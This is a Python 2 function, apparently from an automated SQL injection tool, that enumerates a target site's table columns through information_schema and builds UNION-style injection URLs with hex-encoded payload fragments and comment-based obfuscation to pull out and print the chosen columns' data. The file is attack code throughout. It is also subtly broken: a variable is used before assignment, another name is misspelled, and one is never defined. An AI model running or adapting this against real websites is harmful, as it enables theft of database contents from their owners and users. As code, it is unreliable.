import s_data,dbs,replaces
from prints import print_data,print_cols_tables,intro
from requests import get_the_page
from find_total_cols import ft_cols,uni_cols
from vulnerable import vuln,f_vuln_col
from response import site_alive

def search_in_columns(site,table,based):
    site = site + table + "--" + based
    the_page = get_the_page(site, "2")
    columns_found = s_data.search_for(the_page)
    total_cols = len(columns_found)
    total_cols2 = total_cols
    
    if total_cols:
        print_cols_tables(columns_found,'Columns Found')
        k = 1
        ks = []
        table_choose = table_choose.decode("hex")
        site = site.replace("information_schema.columns+WHERE+table_name=0x"+table_choose.encode("hex")+"--", ans+'.'+table_choose+"--")
        
        while tal_cols > 0:
            col_choose = raw_input("Give a column (give 0 to stop the procedure): ")

            while not(col_choose in columns_found) and not(col_choose == '0'):
                col_choose = raw_input("Give a column (give 0 to stop the procedure): ")

            if col_choose:
                if total_cols == total_cols2:
                    site = site.replace("column_name", "%s,/**/" %col_choose)
                    total_cols = total_cols - 1
                    ks.append(col_choose)
                else:
                    site = site.replace(",/**/,0x3c,0x2f,0x74,0x61,0x62,0x6c,0x65,0x3e,", ",0x3c,0x2f,0x74,0x61,0x62,0x6c,0x65,0x3e,0x3c,0x74,0x61,0x62,0x6c,0x65,0x20,0x73,0x74,0x79,0x6c,0x65,0x3d,0x22,0x77,0x69,0x64,0x74,0x68,0x3a,0x32,0x39,0x25,0x22,0x3e,%s,/**/,0x3c,0x2f,0x74,0x61,0x62,0x6c,0x65,0x3e,"%col_choose)
                    total_cols = total_cols - 1
                    ks.append(col_choose)
                    k = k + 1
            else:
                total_cols = 0

        site = site.replace(",/**/", '')
        site = site.replace(",0x3e0x0a", ",0x3e,0x0a")
        the_page = get_the_page(site, "2")
        total_data = []
        total_data = s_data.search_for(the_page)
        if not len(total_data):
            print "No data found!"
        else:
            print_data(total_data, ks, table_choose)
